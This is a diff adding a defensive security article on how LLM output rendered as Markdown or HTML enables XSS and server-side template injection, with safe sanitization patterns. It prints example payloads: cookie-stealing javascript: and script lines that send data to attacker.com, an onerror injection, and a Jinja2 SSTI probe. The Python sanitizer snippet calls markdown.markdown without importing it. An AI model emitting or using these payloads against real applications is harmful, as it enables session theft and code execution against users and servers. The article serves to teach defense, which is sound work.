@@ -1,0 +1,138 @@
+---
+title: "LLM Output → XSS: When Markdown Becomes Malicious"
+description: "How unsanitized LLM output rendered as HTML can lead to cross-site scripting, stored XSS, and downstream code injection."
+owaspCategory: llm05
+difficulty: intermediate
+severity: high
+cvssScore: 8.2
+tags: ["XSS", "output-handling", "markdown", "injection"]
+author: "Community"
+publishedAt: "2024-02-05"
+relatedLabs: []
+relatedDemos: []
+relatedTools: []
+---
+
+## Why LLM Output Is Untrusted Input
+
+Security engineers have a well-established principle: all data that crosses a trust boundary must be treated as untrusted until validated and sanitized for its intended context. LLM output crosses a critical trust boundary — it originates from a statistical model that can be manipulated by adversarial inputs and is not under the application's control. Despite this, a startling number of LLM-powered applications pipe model output directly into `innerHTML`, template engines, or downstream services without any sanitization step.
+
+The consequences range from reflected XSS in chat interfaces to stored XSS in LLM-powered content generation pipelines, from server-side template injection in backend code generators to command injection in LLM-driven automation agents. Each of these exploits the same root cause: a developer treated the LLM as a trusted author of content, when in fact the LLM's output is shaped by arbitrary user input.
+
+## Markdown-to-XSS Attack Vectors
+
+Most LLM chat interfaces render model output as Markdown rather than plain text, to support formatting like code blocks, bold text, and headers. Markdown parsers convert source text to HTML — and that conversion process introduces multiple XSS injection points.
+
+**Image tag injection**: Markdown supports inline images with the syntax `![alt text](url)`. Most Markdown parsers faithfully convert this to `<img src="url" alt="alt text">`. An attacker who can influence model output to include malicious image URLs can use this to trigger GET requests to attacker-controlled servers (useful for CSRF and cookie exfiltration via query parameters) or to inject `onerror` attributes if the parser does not strip event handlers.
+
+```markdown
+# Malicious Markdown output from LLM
+![x](x" onerror="alert(document.cookie))
+```
+
+If rendered without sanitization, this produces:
+```html
+<img src="x" onerror="alert(document.cookie)" alt="x">
+```
+
+**Link injection with JavaScript protocol**: Markdown link syntax `[text](url)` becomes `<a href="url">text</a>`. Many parsers do not validate that the URL uses a safe protocol. A `javascript:` URL in the href executes JavaScript when the user clicks the link.
+
+```markdown
+[Click here for your report](javascript:fetch('https://attacker.com/steal?c='+document.cookie))
+```
+
+**Raw HTML in Markdown**: The CommonMark specification permits raw HTML blocks within Markdown source. Parsers that implement CommonMark faithfully will pass through `<script>`, `<iframe>`, and event-handler attributes without escaping them.
+
+```markdown
+Here is your summary:
+<script>document.location='https://attacker.com/?session='+document.cookie</script>
+```
+
+**Attribute injection via reference-style links**: Some parsers are vulnerable to attribute injection through Markdown's reference-style link definitions, which can include title attributes containing `"` characters that escape the attribute context.
+
+<Callout type="danger">
+**Stored XSS through LLM content generation is particularly severe.** If your application uses an LLM to generate content that is stored in a database and later rendered to other users — blog posts, product descriptions, customer service responses, auto-generated reports — a single successful injection can affect every user who subsequently views that content. The attacker does not need to interact with victims directly; they poison the content through the LLM, and the application delivers the payload at scale.
+</Callout>
+
+## Server-Side Template Injection via LLM
+
+When LLM output is used as input to server-side template engines (Jinja2, Pebble, Twig, Velocity), the risk escalates from browser-side XSS to server-side code execution. Template injection vulnerabilities allow an attacker to execute arbitrary code on the server.
+
+```python
+# VULNERABLE: using LLM output directly in a Jinja2 template
+from jinja2 import Template
+
+user_request = "Generate a greeting for Alice"
+llm_output = call_llm(user_request)
+
+# If llm_output contains: "Hello {{ ''.__class__.__mro__[1].__subclasses__() }}"
+# This renders as a list of Python classes — a stepping stone to RCE
+template = Template(f"<html><body>{llm_output}</body></html>")
+result = template.render()
+```
+
+## Vulnerable vs. Safe Rendering Patterns
+
+**Vulnerable — direct innerHTML assignment**:
+```javascript
+// NEVER do this
+const chatBubble = document.getElementById('response');
+chatBubble.innerHTML = llmOutput;
+```
+
+**Vulnerable — Marked without sanitization**:
+```javascript
+// STILL vulnerable — Marked does not sanitize by default
+import { marked } from 'marked';
+chatBubble.innerHTML = marked.parse(llmOutput);
+```
+
+**Safe — DOMPurify after Markdown parsing**:
+```javascript
+import { marked } from 'marked';
+import DOMPurify from 'dompurify';
+
+// Configure Marked to be strict about allowed constructs
+const renderer = new marked.Renderer();
+marked.setOptions({ renderer });
+
+// Parse Markdown to HTML, then sanitize the HTML
+const rawHtml = marked.parse(llmOutput);
+const safeHtml = DOMPurify.sanitize(rawHtml, {
+  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'code', 'pre',
+                 'ul', 'ol', 'li', 'blockquote', 'h1', 'h2', 'h3'],
+  ALLOWED_ATTR: [],  // No attributes by default — add 'href' for links with URL validation
+  FORBID_SCRIPTS: true,
+  FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form'],
+});
+
+chatBubble.innerHTML = safeHtml;
+```
+
+**Safe — Python-side sanitization with bleach**:
+```python
+import bleach
+from markdownify import markdownify
+
+ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li']
+ALLOWED_ATTRIBUTES = {}  # No attributes permitted
+
+def safe_render_llm_output(llm_output: str) -> str:
+    """Render LLM Markdown output safely for web display."""
+    # Parse Markdown to HTML using a strict parser
+    html = markdown.markdown(llm_output, extensions=['fenced_code'])
+    # Sanitize the resulting HTML
+    return bleach.clean(html, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES, strip=True)
+```
+
+## Defense Checklist
+
+A robust output handling pipeline for LLM applications should verify all of the following:
+
+- All LLM output is treated as untrusted regardless of the prompt or model used.
+- HTML rendering uses a Markdown parser followed by a dedicated HTML sanitizer (not the parser's built-in sanitization, which is often incomplete).
+- The sanitizer uses an allowlist of safe tags and attributes, not a blocklist of dangerous ones.
+- `javascript:` protocol URLs are explicitly blocked in `href` and `src` attributes.
+- LLM output is never passed directly to server-side template engines.
+- LLM output used in shell commands, SQL queries, or file paths is validated and escaped for the target context separately from HTML sanitization.
+- Content Security Policy (CSP) headers provide a defense-in-depth layer that limits the impact of any sanitization failures.
